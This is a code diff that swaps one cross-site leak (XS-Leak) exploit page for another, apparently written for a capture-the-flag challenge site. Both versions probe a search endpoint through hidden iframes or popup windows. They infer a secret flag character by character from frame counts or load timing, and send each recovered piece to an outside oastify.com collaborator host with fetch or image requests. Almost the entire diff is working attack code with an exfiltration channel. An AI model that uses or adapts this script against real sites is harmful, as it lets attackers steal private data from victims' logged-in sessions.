@@ -1,81 +1,161 @@
-<script>
-const BASE = "https://wonder.cbd2026.cloud";
-const EXFIL = "http://lk9awzmrw79jh6kwcrcnh8scv31upsdh.oastify.com";
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>XS-Leak Exploit</title>
+</head>
+<body>
+    <h1>Exploiting...</h1>
+    <pre id="log"></pre>
 
-const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-=!@#$%^&*().,:;";
-const prefixes = ["CBC{", "FLAG{", "CBD{", "CTF{", "Wonder{", "wonder{"];
-
-function leak(s) {
-  new Image().src = EXFIL + "/?f=" + encodeURIComponent(s) + "&t=" + Date.now();
-}
-
-async function sleep(ms) {
-  return new Promise(r => setTimeout(r, ms));
-}
-
-async function test(q) {
-  let w = open(BASE + "/search?q=" + encodeURIComponent(q), "_blank");
-
-  await sleep(1500);
-
-  let ok = false;
-  try {
-    ok = w.frames.length > 0 || w.length > 0;
-  } catch(e) {
-    ok = false;
-  }
-
-  try { w.close(); } catch(e) {}
-
-  return ok;
-}
-
-async function brute(start) {
-  let flag = start;
-  leak("BRUTE_START:" + flag);
-
-  while (true) {
-    let found = false;
-
-    for (const c of charset) {
-      let guess = flag + c;
-
-      if (await test(guess)) {
-        flag += c;
-        leak(flag);
-        found = true;
-
-        if (c === "}") {
-          leak("DONE:" + flag);
-          return;
+    <script>
+        const log = document.getElementById('log');
+        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-=!@#$%^&*.,:";
+        const TARGET_URL = "https://wonder.cbd2026.cloud";
+        const LEAK_URL = "http://lk9awzmrw79jh6kwcrcnh8scv31upsdh.oastify.com";
+        
+        let flag = "";
+        
+        function logMsg(msg) {
+            log.textContent += msg + "\n";
         }
 
-        break;
-      }
-    }
+        async function test(query) {
+            const url = `${TARGET_URL}/search?q=${encodeURIComponent(query)}`;
+            
+            // Use timing attack - measure page load time
+            const start = performance.now();
+            
+            // Load in hidden iframe
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = url;
+            document.body.appendChild(iframe);
+            
+            // Wait for iframe to load
+            await new Promise(r => setTimeout(r, 2000));
+            
+            const end = performance.now();
+            const duration = end - start;
+            
+            // Clean up
+            document.body.removeChild(iframe);
+            
+            // Log timing for debugging
+            logMsg(`Timing for "${query}": ${duration.toFixed(0)}ms`);
+            fetch(`${LEAK_URL}?f=TIMING:${query}:${duration.toFixed(0)}`)
+                .catch(e => {});
+            
+            // If page has iframe (match), it will take longer to load
+            // Adjust threshold based on actual measurements
+            return duration > 1500;
+        }
 
-    if (!found) {
-      leak("STUCK:" + flag);
-      return;
-    }
-  }
-}
+        async function findPrefix() {
+            const prefixes = ["CBD{", "FLAG{", "CTF{", "wonder{", "Wonder{", "WONDER{", "flag{", "cbd{"];
+            
+            logMsg("Finding correct prefix...");
+            
+            for (const prefix of prefixes) {
+                logMsg(`Testing prefix: ${prefix}`);
+                
+                const isMatch = await test(prefix);
+                
+                // Send result to server
+                fetch(`${LEAK_URL}?f=PREFIX:${prefix}:${isMatch}`)
+                    .catch(e => logMsg("Failed to send: " + e));
+                
+                if (isMatch) {
+                    logMsg(`✓ Found prefix: ${prefix}`);
+                    return prefix;
+                }
+                
+                await new Promise(r => setTimeout(r, 200));
+            }
+            
+            logMsg("No prefix found, trying empty search...");
+            return "";
+        }
 
-async function run() {
-  leak("START");
+        async function timingAttack(query) {
+            const url = `${TARGET_URL}/search?q=${encodeURIComponent(query)}`;
+            
+            const start = performance.now();
+            const w = window.open(url, "timing_window");
+            
+            if (!w) {
+                return false;
+            }
+            
+            await new Promise(r => setTimeout(r, 3000));
+            
+            const end = performance.now();
+            const duration = end - start;
+            
+            w.close();
+            
+            // If page has iframe, it might take longer to load
+            logMsg(`Timing for "${query}": ${duration}ms`);
+            fetch(`${LEAK_URL}?f=TIMING:${query}:${duration}`)
+                .catch(e => {});
+            
+            return duration > 2000; // Threshold - adjust based on testing
+        }
 
-  for (const p of prefixes) {
-    let ok = await test(p);
-    leak("PREFIX:" + p + ":" + ok);
+        async function leakFlag() {
+            // First, find the correct prefix
+            flag = await findPrefix();
+            
+            if (flag === "") {
+                logMsg("Trying brute force from scratch...");
+                // Start with empty and build up
+                flag = "";
+            }
+            
+            logMsg("Starting XS-Leak attack...");
+            logMsg("Current flag: " + flag);
+            
+            while (true) {
+                let found = false;
+                
+                for (const c of chars) {
+                    const testFlag = flag + c;
+                    logMsg(`Testing: ${testFlag}`);
+                    
+                    const isMatch = await test(testFlag);
+                    
+                    if (isMatch) {
+                        flag = testFlag;
+                        logMsg(`✓ Found character: ${c}`);
+                        logMsg(`Current flag: ${flag}`);
+                        
+                        // Send to our server
+                        fetch(`${LEAK_URL}?f=${encodeURIComponent(flag)}`)
+                            .catch(e => logMsg("Failed to send to server: " + e));
+                        
+                        found = true;
+                        break;
+                    }
+                    
+                    // Small delay to avoid rate limiting
+                    await new Promise(r => setTimeout(r, 200));
+                }
+                
+                if (!found) {
+                    logMsg("No more characters found!");
+                    logMsg("Final flag: " + flag);
+                    
+                    // Send final result
+                    fetch(`${LEAK_URL}?f=${encodeURIComponent(flag)}&done=1`)
+                        .catch(e => logMsg("Failed to send final result: " + e));
+                    
+                    break;
+                }
+            }
+        }
 
-    if (ok) {
-      await brute(p);
-      return;
-    }
-  }
-
-  leak("NO_PREFIX_MATCH");
-}
-
-run();
-</script>
+        // Start the exploit
+        leakFlag().catch(e => logMsg("Error: " + e));
+    </script>
+</body>
+</html>
